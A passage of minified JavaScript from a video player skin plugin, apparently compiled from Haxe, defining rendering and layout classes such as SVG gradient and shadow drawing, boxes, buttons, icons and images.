Cd=function(){};wa["bs.player.plugin.skin.model.ProgressThumbnailItem"]=Cd,Cd.__name__="bs.player.plugin.skin.model.ProgressThumbnailItem",Cd.__super__=Zd,Cd.prototype=Ja(Zd.prototype,{imageId:null,url:null,x:null,y:null,__class__:Cd});var $d=function(){};wa["bs.player.plugin.skin.model.ProgressThumbnailSource"]=$d,$d.__name__="bs.player.plugin.skin.model.ProgressThumbnailSource",$d.__super__=Cd,$d.prototype=Ja(Cd.prototype,{id:null,__class__:$d});var oe=function(b,c,d,q){this.imageId=b,this.url=c,this.y=this.x=NaN,this.w=d,this.h=q,this.renderWidth=d,this.renderHeight=q};wa["bs.player.plugin.skin.model.ProgressThumbnailImage"]=oe,oe.__name__="bs.player.plugin.skin.model.ProgressThumbnailImage",oe.__super__=Cd,oe.prototype=Ja(Cd.prototype,{renderWidth:null,renderHeight:null,__class__:oe});var pd=function(){};wa["bs.player.plugin.skin.ui.Redraw"]=pd,pd.__name__="bs.player.plugin.skin.ui.Redraw",pd.redraw=function(b){if(null!=b.element&&!b.isNativeElementNull()){if(1==Ma.allowGpuRedraw&&Ma.enableGPU(b),null!=b.getStyleForStateName())switch(b.elementType._hx_index){case 0:Ma.redrawDefault(b),Ma.redrawTxt(b);break;case 1:Ma.redrawDefault(b),Ma.redrawBox(b);break;case 2:Ma.checkSvgDirty(b)&&Ma.redrawSvg(b);break;case 3:Ma.redrawImg(b);break;case 4:Ma.redrawDefault(b),Ma.redrawShape(b)}b.checkHide(),b.forceHide&&(Ma.addCssClass(b,"hideElement"),b.isNativeElementNull()||b.element.instance.classList.contains("showElement")&&b.element.instance.classList.remove("showElement"))}};var Ma=function(){};wa["bs.player.plugin.skin.ui.RedrawHtml"]=Ma,Ma.__name__="bs.player.plugin.skin.ui.RedrawHtml",Ma.__properties__={get_baseUrl:"get_baseUrl"},Ma.redraw=function(b){if(!b.isNativeElementNull()){if(1==Ma.allowGpuRedraw&&Ma.enableGPU(b),null!=b.getStyleForStateName())switch(b.elementType._hx_index){case 0:Ma.redrawDefault(b),Ma.redrawTxt(b);break;case 1:Ma.redrawDefault(b),Ma.redrawBox(b);break;case 2:Ma.checkSvgDirty(b)&&Ma.redrawSvg(b);break;case 3:Ma.redrawImg(b);break;case 4:Ma.redrawDefault(b),Ma.redrawShape(b)}b.checkHide(),b.forceHide&&(Ma.addCssClass(b,"hideElement"),b.isNativeElementNull()||b.element.instance.classList.contains("showElement")&&b.element.instance.classList.remove("showElement"))}},Ma.redrawFrame=function(b){if(1==Ma.allowGpuRedraw&&Ma.enableGPU(b),null!=b.getStyleForStateName())switch(b.elementType._hx_index){case 0:Ma.redrawDefault(b),Ma.redrawTxt(b);break;case 1:Ma.redrawDefault(b),Ma.redrawBox(b);break;case 2:Ma.checkSvgDirty(b)&&Ma.redrawSvg(b);break;case 3:Ma.redrawImg(b);break;case 4:Ma.redrawDefault(b),Ma.redrawShape(b)}},Ma.enableGPU=function(b){null!=b&&"Skin"==b.id&&Ma.addCssClass(b,"enableGPU")},Ma.checkSvgDirty=function(b){var c=b.getStyleForStateName();return null!=c&&null!=b.parent&&(h.baseUrl()!=fb.__cast(b,K).baseUrl||!c.isClean&&(b="icon|"+b.uid,c=c.icon+"|"+c.iconColor,(!Object.prototype.hasOwnProperty.call(Ma.dirtyCheck.h,b)||Ma.dirtyCheck.h[b]!=c)&&(Ma.dirtyCheck.h[b]=c,!0)))},Ma.checkSvgBaseUrlHasChange=function(b){return h.baseUrl()!=fb.__cast(b,K).baseUrl},Ma.redrawSvg=function(b){if(!b.isNativeElementNull()){var c=b.getStyleForStateName(),d=b.element,q=d.instance.style;if(null!=c.gradient){var X=c.gradient;if(0<(q=b.element.instance).childNodes.length)for(var ra=0,Aa=q.childNodes;ra<Aa.length;)c=Aa[ra],++ra,q.removeChild(c);c="bradmax_"+b.parent.id+"_"+X.name,(d=window.document.createElementNS(Ma.svgNS,X.name)).setAttributeNS(null,"id",c),null==X.attributes&&(X.attributes={}),ra=Math.PI/180*(null!=X.rotate?X.rotate:0),X.attributes.x1=Math.round(50+50*Math.sin(ra))+"%",X.attributes.y1=Math.round(50+50*Math.cos(ra))+"%",X.attributes.x2=Math.round(50+50*Math.sin(ra+Math.PI))+"%",X.attributes.y2=Math.round(50+50*Math.cos(ra+Math.PI))+"%";var Qa=m.fields(X.attributes);for(ra=0;ra<Qa.length;)Aa=Qa[ra],++ra,d.setAttributeNS(null,Aa,m.field(X.attributes,Aa));for(ra=0,Aa=X.stops;ra<Aa.length;)X=Aa[ra],++ra,(Qa=window.document.createElementNS(Ma.svgNS,"stop")).setAttributeNS(null,"offset",""+X.offset),Qa.setAttributeNS(null,"style","stop-color:"+X.color+";stop-opacity:"+X.opacity+";"),d.appendChild(Qa);if((X=window.document.createElementNS(Ma.svgNS,"rect")).setAttributeNS(null,"x","0"),X.setAttributeNS(null,"y","0"),X.setAttributeNS(null,"width","100%"),X.setAttributeNS(null,"height","100%"),X.setAttributeNS(null,"fill","url("+Ma.get_baseUrl()+"#"+c+")"),q.appendChild(d),q.appendChild(X),h.isEdge){if(null==(c=b.get_width())&&null!=b.parent){for(d=b.parent;null!=d&&null==d.get_width();)d=d.parent;null!=d&&(c=d.get_width())}null==(d=b.get_height())&&null!=b.parent&&(d=b.parent.get_height()),null!=c&&null!=d&&q.setAttributeNS(null,"viewBox","0 0 "+c+" "+d)}else q.removeAttributeNS(null,"viewBox")}else if(null!=c.icon){if(X=Ma.get_baseUrl()+"#bradmax_"+c.icon+"_"+Ma.build,d.instance.firstChild.setAttributeNS(Ma.xlinkNS,"href",X),fb.__cast(b,K).baseUrl=""+Ma.get_baseUrl(),null!=c.iconPadding&&(q.padding=c.iconPadding+""+Ma.units),b.mouseEnable=!1,null!=c.preserveAspectRatio&&d.instance.setAttributeNS(null,"preserveAspectRatio",c.preserveAspectRatio),null!=c.shadow&&null!=b.parent.context){Qa=c.shadow,X=(q=b.element.instance).getElementsByTagName("use")[0];var Wa=q.getElementsByTagName("filter");for(ra=0,Aa=Wa.length;ra<Aa;){var Cb=ra++;q.removeChild(Wa.item(Cb))}ra="bradmax_"+b.parent.id+"_dropShadow",Aa=.01745329251*Qa.angle,Wa=Math.round(Math.cos(Aa)*Qa.distance),Cb=Math.round(Math.sin(Aa)*Qa.distance);var Ub="rgba("+(Aa=$c.HexToRGB(lc.getColor(b.parent.context,Qa.color))).r+","+Aa.g+","+Aa.b+","+(null==Qa.alpha?1:Qa.alpha)+")";(Aa=window.document.createElementNS(Ma.svgNS,"filter")).setAttributeNS(null,"id",ra),Aa.setAttributeNS(null,"height","130%"),Aa.setAttributeNS(null,"width","130%"),q.appendChild(Aa),(q=window.document.createElementNS(Ma.svgNS,"feGaussianBlur")).id=ra+"-blur",q.setAttributeNS(null,"in","SourceAlpha"),q.setAttributeNS(null,"stdDeviation",""+Qa.blur),Aa.appendChild(q),(q=window.document.createElementNS(Ma.svgNS,"feOffset")).id=ra+"-offset",q.setAttributeNS(null,"dx",""+Wa),q.setAttributeNS(null,"dy",""+Cb),q.setAttributeNS(null,"result","offsetblur"),Aa.appendChild(q),(q=window.document.createElementNS(Ma.svgNS,"feFlood")).id=ra+"-flood",q.setAttributeNS(null,"flood-color",""+Ub),Aa.appendChild(q),(q=window.document.createElementNS(Ma.svgNS,"feComposite")).id=ra+"-composite",q.setAttributeNS(null,"in2","offsetblur"),q.setAttributeNS(null,"operator","in"),Aa.appendChild(q),(q=window.document.createElementNS(Ma.svgNS,"feMerge")).id=ra+"-merge",Aa.appendChild(q),(Qa=window.document.createElementNS(Ma.svgNS,"feMergeNode")).id=ra+"-merge1",q.appendChild(Qa),(Qa=window.document.createElementNS(Ma.svgNS,"feMergeNode")).id=ra+"-merge2",Qa.setAttributeNS(null,"in","SourceGraphic"),q.appendChild(Qa),q="url("+Ma.get_baseUrl()+"#"+ra+")",X.setAttributeNS(null,"filter",q)}null!=c.iconColor&&(d.instance.firstChild.style.fill=lc.getColor(b.parent.context,c.iconColor))}}},Ma.redrawImg=function(b){if(!b.isNativeElementNull()&&Ma.setVisibility(b)){Ma.addCssClass(b,"imageElement");var c=b.element,d=c.instance.style;b.isNativeElementNull()||b.element.instance.classList.contains("withBorder")&&b.element.instance.classList.remove("withBorder"),Ma.addCssClass(b,"withoutBorder");var q=b.getStyleForStateName();if(null!=b.data&&!c.isEqualSrc(b.data)){var X=b.element;X.set_loaded(!1),c.set_src(b.data),null!=X.instance&&((c=X.instance).complete||0<c.width)&&c.onload()}null!=q.color&&(c=$c.HexToRGB(q.color),d.background="rgba("+c.r+","+c.g+","+c.b+","+(null==q.alpha?1:q.alpha)+")"),Ma.setMouseEvents(b),Ma.setSizePosition(b)}},Ma.redrawShape=function(b){if(!b.isNativeElementNull()&&Ma.setVisibility(b)){Ma.addCssClass(b,"imageElement"),b.isNativeElementNull()||b.element.instance.classList.contains("withBorder")&&b.element.instance.classList.remove("withBorder"),Ma.addCssClass(b,"withoutBorder");var c=b.getStyleForStateName();if(null!=c.icon){var d=m.getProperty(md.getInstance().skinStyle,c.icon);null!=d&&(b.element.instance.src=d)}null!=c.color&&(d=$c.HexToRGB(c.color),b.element.instance.style.background="rgba("+d.r+","+d.g+","+d.b+","+(null==c.alpha?1:c.alpha)+")"),Ma.setMouseEvents(b),Ma.setSizePosition(b)}},Ma.redrawTxt=function(b){if(!b.isNativeElementNull()){var c=b.element.instance.style;b instanceof ze?Ma.addCssClass(b,"textElement"):b instanceof Qc&&Ma.addCssClass(b,"labelElement"),null==b.get_align()||""==b.get_align()||"left"==b.get_align()?(b.isNativeElementNull()||b.element.instance.classList.contains("alignCenter")&&b.element.instance.classList.remove("alignCenter"),b.isNativeElementNull()||b.element.instance.classList.contains("alignRight")&&b.element.instance.classList.remove("alignRight"),Ma.addCssClass(b,"alignLeft")):"right"==b.get_align()?(b.isNativeElementNull()||b.element.instance.classList.contains("alignCenter")&&b.element.instance.classList.remove("alignCenter"),Ma.addCssClass(b,"alignRight"),b.isNativeElementNull()||b.element.instance.classList.contains("alignLeft")&&b.element.instance.classList.remove("alignLeft")):"center"==b.get_align()&&(Ma.addCssClass(b,"alignCenter"),b.isNativeElementNull()||b.element.instance.classList.contains("alignRight")&&b.element.instance.classList.remove("alignRight"),b.isNativeElementNull()||b.element.instance.classList.contains("alignLeft")&&b.element.instance.classList.remove("alignLeft"));var d=b.getStyleForStateName();if(null!=d.fontFamily&&Ma.addCssClass(b,d.fontFamily),null!=d.fontColor&&(c.color=d.fontColor),null!=d.fontSize&&(c.fontSize=d.fontSize+""+Ma.units),null!=d.shadow&&null!=b.context){var q=d.shadow,X=.01745329251*q.angle,ra=Math.round(Math.cos(X)*q.distance);X=Math.round(Math.sin(X)*q.distance);var Aa=$c.HexToRGB(lc.getColor(b.context,q.color));c.textShadow=ra+(Ma.units+" ")+X+Ma.units+" "+q.blur+Ma.units+" rgba("+Aa.r+","+Aa.g+","+Aa.b+","+(null==q.alpha?1:q.alpha)+")",null!=d.shadow.blur&&(c.paddingLeft=d.shadow.blur+"px")}null!=d.fontResponsive&&b instanceof ye&&(b.fitFontSizeToParentWidth(),c.fontSize=d.fontSize+""+Ma.units,null!=b.parent&&fb.__cast(b.parent,Xb).overflowHidden&&(b.fitFontSizeToParentHeight(),c.fontSize=d.fontSize+""+Ma.units))}},Ma.setSizePosition=function(b){if(!b.isNativeElementNull()&&null!=b.getStyleForStateName()){var c=b.element.instance.style;c.width=b.calculateWidth()+""+Ma.units,c.height=b.calculateHeight()+""+Ma.units,c.left=b.calculateX()+""+Ma.units,c.top=b.calculateY()+""+Ma.units}},Ma.redrawBox=function(b){if(!b.isNativeElementNull()){var c=b.getStyleForStateName(),d=b.element.instance.style;if(null!=c.shadow&&null!=b.context){var q=.01745329251*(c=c.shadow).angle,X=Math.round(Math.cos(q)*c.distance);q=Math.round(Math.sin(q)*c.distance),b=$c.HexToRGB(lc.getColor(b.context,c.color)),d.webkitBoxShadow=d.mozBoxShadow=d.boxShadow=X+(Ma.units+" ")+q+Ma.units+" "+c.blur+Ma.units+" 0 rgba("+b.r+","+b.g+","+b.b+","+(null==c.alpha?1:c.alpha)+")"}}},Ma.redrawDefault=function(b){Ma.addCssClass(b,"defaultElement");var c=b.getStyleForStateName();if(null!=c&&!b.isNativeElementNull()){var d=b.element;if(Ma.setVisibility(b)){if(d=d.instance.style,null!=b.alpha&&d.opacity!=""+b.alpha&&(d.opacity=""+b.alpha),null!=b.rotation){var q="rotate("+b.rotation+"deg)";d.webkitTransform!=q&&(d.webkitTransform=q),d.transform!=q&&(d.transform=q)}if(!c.isClean){if(null!=c.color&&(q="rgba("+(q=$c.HexToRGB(c.color)).r+","+q.g+","+q.b+","+(null==c.alpha?1:c.alpha)+")",d.background!=q&&(d.background=q)),null!=c.borderRadius&&((q=(""+c.borderRadius).split(" ")).push(""),q=q.join(Ma.units+" "),d.borderRadius!=q&&(d.borderRadius=q)),null!=c.borderWidth?(d.borderWidth=c.borderWidth+""+Ma.units,Ma.addCssClass(b,"withBorder")):b.isNativeElementNull()||b.element.instance.classList.contains("withBorder")&&b.element.instance.classList.remove("withBorder"),null!=c.borderColor){q=$c.HexToRGB(c.borderColor);var X=null==c.borderAlpha?1:c.borderAlpha;d.borderColor!="rgba("+q.r+","+q.g+","+q.b+","+X+")"&&(d.borderColor="rgba("+q.r+","+q.g+","+q.b+","+X+")")}(b instanceof rc||b instanceof ca||b instanceof ta)&&Ma.addCssClass(b,"buttonElement"),c.isClean=!0}Ma.setSizePosition(b),b.overflowHidden?Ma.addCssClass(b,"overflowHidden"):b.isNativeElementNull()||b.element.instance.classList.contains("overflowHidden")&&b.element.instance.classList.remove("overflowHidden"),Ma.setMouseEvents(b),b.mouseEnable?(Ma.addCssClass(b,"mouseEnable"),b.isNativeElementNull()||b.element.instance.classList.contains("mouseDisable")&&b.element.instance.classList.remove("mouseDisable")):(Ma.addCssClass(b,"mouseDisable"),b.isNativeElementNull()||b.element.instance.classList.contains("mouseEnable")&&b.element.instance.classList.remove("mouseEnable"))}}},Ma.setMouseEvents=function(b){b.mouseEnable?(Ma.addCssClass(b,"mouseEnable"),b.isNativeElementNull()||b.element.instance.classList.contains("mouseDisable")&&b.element.instance.classList.remove("mouseDisable")):(Ma.addCssClass(b,"mouseDisable"),b.isNativeElementNull()||b.element.instance.classList.contains("mouseEnable")&&b.element.instance.classList.remove("mouseEnable"))},Ma.setVisibility=function(b){return 0==b.visible?(Ma.addCssClass(b,"hideElement"),b.isNativeElementNull()||b.element.instance.classList.contains("showElement")&&b.element.instance.classList.remove("showElement"),!1):(Ma.addCssClass(b,"showElement"),b.isNativeElementNull()||b.element.instance.classList.contains("hideElement")&&b.element.instance.classList.remove("hideElement"),!0)},Ma.boxShadow=function(b,c){var d=.01745329251*c.angle,q=Math.round(Math.cos(d)*c.distance);return d=Math.round(Math.sin(d)*c.distance),b=$c.HexToRGB(lc.getColor(b,c.color)),q+(Ma.units+" ")+d+Ma.units+" "+c.blur+Ma.units+" 0 rgba("+b.r+","+b.g+","+b.b+","+(null==c.alpha?1:c.alpha)+")"},Ma.textShadow=function(b,c){var d=.01745329251*c.angle,q=Math.round(Math.cos(d)*c.distance);return d=Math.round(Math.sin(d)*c.distance),b=$c.HexToRGB(lc.getColor(b,c.color)),q+(Ma.units+" ")+d+Ma.units+" "+c.blur+Ma.units+" rgba("+b.r+","+b.g+","+b.b+","+(null==c.alpha?1:c.alpha)+")"},Ma.svgGradient=function(b,c){var d=b.element.instance;if(0<d.childNodes.length)for(var q=0,X=d.childNodes;q<X.length;){var ra=X[q];++q,d.removeChild(ra)}ra="bradmax_"+b.parent.id+"_"+c.name;var Aa=window.document.createElementNS(Ma.svgNS,c.name);for(Aa.setAttributeNS(null,"id",ra),null==c.attributes&&(c.attributes={}),q=Math.PI/180*(null!=c.rotate?c.rotate:0),c.attributes.x1=Math.round(50+50*Math.sin(q))+"%",c.attributes.y1=Math.round(50+50*Math.cos(q))+"%",c.attributes.x2=Math.round(50+50*Math.sin(q+Math.PI))+"%",c.attributes.y2=Math.round(50+50*Math.cos(q+Math.PI))+"%",X=m.fields(c.attributes),q=0;q<X.length;){var Qa=X[q];++q,Aa.setAttributeNS(null,Qa,m.field(c.attributes,Qa))}for(q=0,X=c.stops;q<X.length;)c=X[q],++q,(Qa=window.document.createElementNS(Ma.svgNS,"stop")).setAttributeNS(null,"offset",""+c.offset),Qa.setAttributeNS(null,"style","stop-color:"+c.color+";stop-opacity:"+c.opacity+";"),Aa.appendChild(Qa);if((q=window.document.createElementNS(Ma.svgNS,"rect")).setAttributeNS(null,"x","0"),q.setAttributeNS(null,"y","0"),q.setAttributeNS(null,"width","100%"),q.setAttributeNS(null,"height","100%"),q.setAttributeNS(null,"fill","url("+Ma.get_baseUrl()+"#"+ra+")"),d.appendChild(Aa),d.appendChild(q),h.isEdge){if(null==(ra=b.get_width())&&null!=b.parent){for(Aa=b.parent;null!=Aa&&null==Aa.get_width();)Aa=Aa.parent;null!=Aa&&(ra=Aa.get_width())}null==(Aa=b.get_height())&&null!=b.parent&&(Aa=b.parent.get_height()),null!=ra&&null!=Aa&&d.setAttributeNS(null,"viewBox","0 0 "+ra+" "+Aa)}else d.removeAttributeNS(null,"viewBox")},Ma.svgShadow=function(b,c){for(var d=b.element.instance,q=d.getElementsByTagName("use")[0],X=d.getElementsByTagName("filter"),ra=0,Aa=X.length;ra<Aa;){var Qa=ra++;d.removeChild(X.item(Qa))}X="bradmax_"+b.parent.id+"_dropShadow",Aa=.01745329251*c.angle,ra=Math.round(Math.cos(Aa)*c.distance),Aa=Math.round(Math.sin(Aa)*c.distance),Qa="rgba("+(b=$c.HexToRGB(lc.getColor(b.parent.context,c.color))).r+","+b.g+","+b.b+","+(null==c.alpha?1:c.alpha)+")",(b=window.document.createElementNS(Ma.svgNS,"filter")).setAttributeNS(null,"id",X),b.setAttributeNS(null,"height","130%"),b.setAttributeNS(null,"width","130%"),d.appendChild(b),(d=window.document.createElementNS(Ma.svgNS,"feGaussianBlur")).id=X+"-blur",d.setAttributeNS(null,"in","SourceAlpha"),d.setAttributeNS(null,"stdDeviation",""+c.blur),b.appendChild(d),(c=window.document.createElementNS(Ma.svgNS,"feOffset")).id=X+"-offset",c.setAttributeNS(null,"dx",""+ra),c.setAttributeNS(null,"dy",""+Aa),c.setAttributeNS(null,"result","offsetblur"),b.appendChild(c),(c=window.document.createElementNS(Ma.svgNS,"feFlood")).id=X+"-flood",c.setAttributeNS(null,"flood-color",""+Qa),b.appendChild(c),(c=window.document.createElementNS(Ma.svgNS,"feComposite")).id=X+"-composite",c.setAttributeNS(null,"in2","offsetblur"),c.setAttributeNS(null,"operator","in"),b.appendChild(c),(c=window.document.createElementNS(Ma.svgNS,"feMerge")).id=X+"-merge",b.appendChild(c),(d=window.document.createElementNS(Ma.svgNS,"feMergeNode")).id=X+"-merge1",c.appendChild(d),(d=window.document.createElementNS(Ma.svgNS,"feMergeNode")).id=X+"-merge2",d.setAttributeNS(null,"in","SourceGraphic"),c.appendChild(d),X="url("+Ma.get_baseUrl()+"#"+X+")",q.setAttributeNS(null,"filter",X)},Ma.addCssClass=function(b,c){b.isNativeElementNull()||b.element.instance.classList.contains(c)||b.element.instance.classList.add(c)},Ma.removeCssClass=function(b,c){b.isNativeElementNull()||b.element.instance.classList.contains(c)&&b.element.instance.classList.remove(c)},Ma.get_baseUrl=function(){var b=h.baseUrl();return f.endsWith(b,"#")&&(b=da.substr(b,0,b.length-1)),b};var fc=function(){Xb.call(this),this.set_color(NaN),this.set_borderRadius(0),this.allowRedraw=!0};wa["bs.player.plugin.skin.ui.box.Box"]=fc,fc.__name__="bs.player.plugin.skin.ui.box.Box",fc.__super__=Xb,fc.prototype=Ja(Xb.prototype,{color:null,borderRadius:null,redraw:function(){if(this.allowRedraw&&null!=this.element&&!this.isNativeElementNull()){if(1==Ma.allowGpuRedraw&&Ma.enableGPU(this),null!=this.getStyleForStateName())switch(this.elementType._hx_index){case 0:Ma.redrawDefault(this),Ma.redrawTxt(this);break;case 1:Ma.redrawDefault(this),Ma.redrawBox(this);break;case 2:Ma.checkSvgDirty(this)&&Ma.redrawSvg(this);break;case 3:Ma.redrawImg(this);break;case 4:Ma.redrawDefault(this),Ma.redrawShape(this)}this.checkHide(),this.forceHide&&(Ma.addCssClass(this,"hideElement"),this.isNativeElementNull()||this.element.instance.classList.contains("showElement")&&this.element.instance.classList.remove("showElement"))}},set_color:function(b){return this.color=b,this.redrawCall(),this.color},set_borderRadius:function(b){return this.borderRadius=b,this.redrawCall(),this.borderRadius},__class__:fc,__properties__:Ja(Xb.prototype.__properties__,{set_borderRadius:"set_borderRadius",set_color:"set_color"})});var pe=function(){fc.call(this)};wa["bs.player.plugin.skin.ui.box.HBox"]=pe,pe.__name__="bs.player.plugin.skin.ui.box.HBox",pe.__super__=fc,pe.prototype=Ja(fc.prototype,{update:function(){if(fc.prototype.update.call(this),!(null==this.children||1>this.children.length))for(var d,q,b="right"==this.get_align(),c=b?this.calculateWidth():0,X=this.children.length,ra=0;ra<X;)d=ra++,0==(q=b?this.children[X-1-d]:this.children[d]).visible||q.forceHide||(q instanceof Qc?(q.set_left(c),d=null==q.get_width()&&null==q.get_percentWidth()?fb.__cast(q,Qc).calculateTextWidth():q.calculateWidth(),b?(c-=d,q.set_left(q.get_left()-d)):c+=d):(d=q.calculateWidth(),b?(q.set_left(c-d),c-=d):(q.set_left(c),c+=d)),q.update())},readUids:function(b){for(var c=[],d=0,q=this.children;d<q.length;){var X=q[d];if(++d,X.uid==b.uid)break;c.push(X.uid)}return c},findUid:function(b,c){for(var d=0,q=b.children.length;d<q;){var X=d++;if(b.children[X].uid==c)return X}return-1},addItemAtUid:function(b,c){c.reverse();for(var d=0,q=c.length;d<q;){var X=d++;if(-1!=(X=this.findUid(this,c[X])))return this.addChildAt(b,X+1),void c.reverse()}c.reverse()},__class__:pe});var ae=function(){fc.call(this)};wa["bs.player.plugin.skin.ui.box.VBox"]=ae,ae.__name__="bs.player.plugin.skin.ui.box.VBox",ae.__super__=fc,ae.prototype=Ja(fc.prototype,{update:function(){if(fc.prototype.update.call(this),!(1>this.children.length))for(var b,d,c=0,q=0,X=this.children.length;q<X;)b=q++,0==(d=this.children[b]).visible||d.forceHide||(d.set_top(c),b=d instanceof Qc&&null==d.get_height()&&null==d.get_percentHeight()?fb.__cast(d,Qc).calculateTextHeight():d.calculateHeight(),d.update(),c+=b)},__class__:ae});var rc=function(){this.onClickUrlTarget="_blank",fc.call(this)};wa["bs.player.plugin.skin.ui.button.Button"]=rc,rc.__name__="bs.player.plugin.skin.ui.button.Button",rc.__super__=fc,rc.prototype=Ja(fc.prototype,{onClickUrlTarget:null,onClickUrl:null,createNativeElement:function(){this.element=new ub,this.eventElement=this.element.create(),this.addEventListener("mouseenter",U(this,this.onOver)),this.addEventListener("mouseleave",U(this,this.onOut))},set_onClickUrl:function(b){return this.onClickUrl=b,this.update(),this.onClickUrl},set_onClickUrlTarget:function(b){return this.onClickUrlTarget=b,this.update(),this.onClickUrlTarget},update:function(){if(null!=this.element){var b=this.element.instance;null!=b&&(null!=this.onClickUrl?(b.target=this.onClickUrlTarget,b.href=this.onClickUrl):(b.removeAttribute("target"),b.removeAttribute("href")))}fc.prototype.update.call(this)},onOver:function(b){null!=this.states&&null!=this.states.over&&(this.currentStateName[0]="over",this.setStateName(this.currentStateName))},onOut:function(b){this.currentStateName[0]="normal",this.setStateName(this.currentStateName)},__class__:rc,__properties__:Ja(fc.prototype.__properties__,{set_onClickUrl:"set_onClickUrl",set_onClickUrlTarget:"set_onClickUrlTarget"})});var ta=function(){this.iconAsset=new K,rc.call(this),this.mouseEnable=!1,this.elementType=n.SHAPE,this.allowRedraw=!0,this.addChild(this.iconAsset)};wa["bs.player.plugin.skin.ui.button.IconButton"]=ta,ta.__name__="bs.player.plugin.skin.ui.button.IconButton",ta.__super__=rc,ta.prototype=Ja(rc.prototype,{icon:null,iconAsset:null,setStateName:function(b){return this.currentStateName=b,rc.prototype.setStateName.call(this,b),this.iconAsset.currentStateName=b,this.iconAsset.setStateName(b),this.iconAsset.redrawCall(),this.redrawCall(),this.styles},redraw:function(){if(null!=this.element&&!this.isNativeElementNull()){if(1==Ma.allowGpuRedraw&&Ma.enableGPU(this),null!=this.getStyleForStateName())switch(this.elementType._hx_index){case 0:Ma.redrawDefault(this),Ma.redrawTxt(this);break;case 1:Ma.redrawDefault(this),Ma.redrawBox(this);break;case 2:Ma.checkSvgDirty(this)&&Ma.redrawSvg(this);break;case 3:Ma.redrawImg(this);break;case 4:Ma.redrawDefault(this),Ma.redrawShape(this)}this.checkHide(),this.forceHide&&(Ma.addCssClass(this,"hideElement"),this.isNativeElementNull()||this.element.instance.classList.contains("showElement")&&this.element.instance.classList.remove("showElement"))}},set_styles:function(b){return this.styles=b,this.iconAsset.set_styles(m.copy(this.styles)),this.redrawCall(),this.styles},set_icon:function(b){return this.icon=b},set_data:function(b){return this.data=b,this.iconAsset.set_data(this.data),this.redrawCall(),this.data},__class__:ta,__properties__:Ja(rc.prototype.__properties__,{set_icon:"set_icon"})});var ca=function(){this.image=new y,rc.call(this),this.set_color(NaN),this.allowRedraw=!0,this.mouseEnable=!1,this.image.set_percentWidth(1),this.addChild(this.image)};wa["bs.player.plugin.skin.ui.button.ImageButton"]=ca,ca.__name__="bs.player.plugin.skin.ui.button.ImageButton",ca.__super__=rc,ca.prototype=Ja(rc.prototype,{icon:null,image:null,createNativeElement:function(){rc.prototype.createNativeElement.call(this)},setStateName:function(b){return this.currentStateName=b,rc.prototype.setStateName.call(this,b),this.image.currentStateName=b,this.image.setStateName(b),this.redrawCall(),this.styles},set_data:function(b){return this.data=b,this.image.set_data(this.data),this.redrawCall(),this.data},set_icon:function(b){return this.set_data(this.icon=b)},get_icon:function(){return this.set_icon(this.data)},__class__:ca,__properties__:Ja(rc.prototype.__properties__,{set_icon:"set_icon"})});var n=Na["bs.player.plugin.skin.ui.core.ElementType"]={__ename__:!0,__constructs__:null,TXT:{_hx_name:"TXT",_hx_index:0,__enum__:"bs.player.plugin.skin.ui.core.ElementType",toString:Va},BOX:{_hx_name:"BOX",_hx_index:1,__enum__:"bs.player.plugin.skin.ui.core.ElementType",toString:Va},SVG:{_hx_name:"SVG",_hx_index:2,__enum__:"bs.player.plugin.skin.ui.core.ElementType",toString:Va},IMG:{_hx_name:"IMG",_hx_index:3,__enum__:"bs.player.plugin.skin.ui.core.ElementType",toString:Va},SHAPE:{_hx_name:"SHAPE",_hx_index:4,__enum__:"bs.player.plugin.skin.ui.core.ElementType",toString:Va}};n.__constructs__=[n.TXT,n.BOX,n.SVG,n.IMG,n.SHAPE];var k=function(){this.states={},this.styles={},Zc.call(this)};wa["bs.player.plugin.skin.ui.geom.Spacer"]=k,k.__name__="bs.player.plugin.skin.ui.geom.Spacer",k.__super__=Zc,k.prototype=Ja(Zc.prototype,{styles:null,states:null,set_styles:function(b){return this.styles=b},set_states:function(b){return this.states=b},__class__:k,__properties__:Ja(Zc.prototype.__properties__,{set_states:"set_states",set_styles:"set_styles"})});var e=function(){this.iconAsset=new K,fc.call(this),this.elementType=n.BOX,this.allowRedraw=!0,this.addChild(this.iconAsset)};wa["bs.player.plugin.skin.ui.graphic.Icon"]=e,e.__name__="bs.player.plugin.skin.ui.graphic.Icon",e.__super__=fc,e.prototype=Ja(fc.prototype,{icon:null,iconAsset:null,setStateName:function(b){return this.currentStateName=b,fc.prototype.setStateName.call(this,b),this.iconAsset.currentStateName=b,this.iconAsset.setStateName(b),this.iconAsset.redrawCall(),this.redrawCall(),this.styles},redraw:function(){if(null!=this.element&&!this.isNativeElementNull()){if(1==Ma.allowGpuRedraw&&Ma.enableGPU(this),null!=this.getStyleForStateName())switch(this.elementType._hx_index){case 0:Ma.redrawDefault(this),Ma.redrawTxt(this);break;case 1:Ma.redrawDefault(this),Ma.redrawBox(this);break;case 2:Ma.checkSvgDirty(this)&&Ma.redrawSvg(this);break;case 3:Ma.redrawImg(this);break;case 4:Ma.redrawDefault(this),Ma.redrawShape(this)}this.checkHide(),this.forceHide&&(Ma.addCssClass(this,"hideElement"),this.isNativeElementNull()||this.element.instance.classList.contains("showElement")&&this.element.instance.classList.remove("showElement"))}},set_states:function(b){return this.states=b,this.set_styles(this.setStateName(["normal"])),this.update(),this.states},set_styles:function(b){return this.styles=b,this.iconAsset.set_styles(m.copy(this.styles)),this.redrawCall(),this.styles},set_icon:function(b){return this.icon=b},__class__:e,__properties__:Ja(fc.prototype.__properties__,{set_icon:"set_icon"})});var y=function(){Xb.call(this),this.mouseEnable=!1,this.set_color(NaN),this.elementType=n.IMG,this.allowRedraw=!0};wa["bs.player.plugin.skin.ui.graphic.Image"]=y,y.__name__="bs.player.plugin.skin.ui.graphic.Image",y.__super__=Xb,y.prototype=Ja(Xb.prototype,{loaded:null,size:null,color:null,createNativeElement:function(){var b=new gb;this.eventElement=b.create(),b.onLoadError=U(this,this.onLoadError),b.onLoad=U(this,this.onLoad),this.element=b},redraw:function(){if(null!=this.element&&!this.isNativeElementNull()){if(1==Ma.allowGpuRedraw&&Ma.enableGPU(this),null!=this.getStyleForStateName())switch(this.elementType._hx_index){case 0:Ma.redrawDefault(this),Ma.redrawTxt(this);break;case 1:Ma.redrawDefault(this),Ma.redrawBox(this);break;case 2:Ma.checkSvgDirty(this)&&Ma.redrawSvg(this);break;case 3:Ma.redrawImg(this);break;case 